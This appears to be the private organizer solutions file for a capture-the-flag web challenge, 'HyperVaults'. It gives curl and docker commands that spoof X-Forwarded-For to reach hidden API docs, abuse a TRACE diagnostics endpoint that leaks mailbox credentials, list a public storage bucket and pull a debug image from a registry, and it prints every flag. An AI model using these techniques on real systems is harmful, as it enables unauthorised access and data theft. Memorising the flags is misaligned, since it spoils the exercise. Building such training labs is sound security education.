# Internal Solutions

Keep this file private from players.

## Full Chain

1. Open `https://hypervaults.io/api/docs` and confirm normal public access is blocked.
2. Spoof localhost through the vulnerable proxy docs route:

```bash
curl -s -H "X-Forwarded-For: 127.0.0.1" \
  https://hypervaults.io/api/openapi.json
```

The OpenAPI description contains:

```text
Securinets{headers_dont_lie_they_get_forwarded}
```

3. In the OpenAPI schema, notice `TRACE /api/diagnostics/mail`.
4. Call the diagnostics endpoint:

```bash
curl -s -X TRACE \
  -H "X-Forwarded-For: 127.0.0.1" \
  https://hypervaults.io/api/diagnostics/mail | jq
```

The response contains the diagnostics flag:

```text
Securinets{trace_it_till_you_make_it}
```

It also leaks Mailpit access:

```text
devmail / <MAILPIT_BASIC_PASSWORD from .env>
```

5. Open `https://mailpit.hypervaults.io/mailpit/` and authenticate. Read the message titled `Mail diagnostic warning`.

Flag:

```text
Securinets{dev_mailboxes_do_not_belong_in_prod}
```

6. Register a normal HyperVaults account at `https://hypervaults.io`, upload a harmless text file, then request its download URL:

```bash
curl -s -H "Authorization: Bearer <token>" \
  https://hypervaults.io/api/files/<file_id>/download | jq
```

The response includes `public_object_url`. Browse or query the bucket listing:

```bash
curl -s "https://hypervaults.io/objects/hypervaults-files/?list-type=2"
curl -s "https://hypervaults.io/objects/hypervaults-files/flag.txt"
```

Flag:

```text
Securinets{public_buckets_make_private_uploads_public}
```

7. Optional Harbor branch: enable Harbor, seed the image, and restart Mailpit seeding. The Harbor bootstrap email reveals:

```text
https://registry.hypervaults.io
admin / <HARBOR_ADMIN_PASSWORD from .env>
registry.hypervaults.io/hypervaults/hypervaults-api:staging-debug
```

Pull and read:

```bash
docker login registry.hypervaults.io -u admin -p '<HARBOR_ADMIN_PASSWORD>'
docker pull registry.hypervaults.io/hypervaults/hypervaults-api:staging-debug
docker run --rm --entrypoint cat \
  registry.hypervaults.io/hypervaults/hypervaults-api:staging-debug \
  /app/build-notes.txt
```

Flag:

```text
Securinets{debug_images_should_not_reach_prod_registries}
```

## Seeded Users and Credentials

- HyperVaults app users: none seeded; players self-register.
- Mailpit Basic Auth: `MAILPIT_BASIC_USER` / `MAILPIT_BASIC_PASSWORD`.
- MinIO organizer console: `MINIO_ROOT_USER` / `MINIO_ROOT_PASSWORD`, bound to localhost only.
- PostgreSQL: `POSTGRES_USER` / `POSTGRES_PASSWORD`, Docker-internal only.
- Harbor optional: `HARBOR_ADMIN_USER` / `HARBOR_ADMIN_PASSWORD`, disposable challenge service only.

## Reset Notes

- Re-seed mail only: wait up to `MAILPIT_RESEED_INTERVAL_SECONDS` seconds or run `docker compose restart backend`
- Full HyperVaults reset: `docker compose down -v && docker compose up -d --build`

## Known Limitations

- Mailpit does not provide a native read-only public UI. The workshop read-only model is enforced by Nginx method filtering, plus the backend re-sends missing seed messages every 10 seconds. Do not expose Mailpit port `8025`.
- Harbor is intentionally external because upstream Harbor generates its own Compose deployment. The main stack only proxies and seeds discovery material after Harbor is installed.
- External scoring platforms are not managed by this repo.
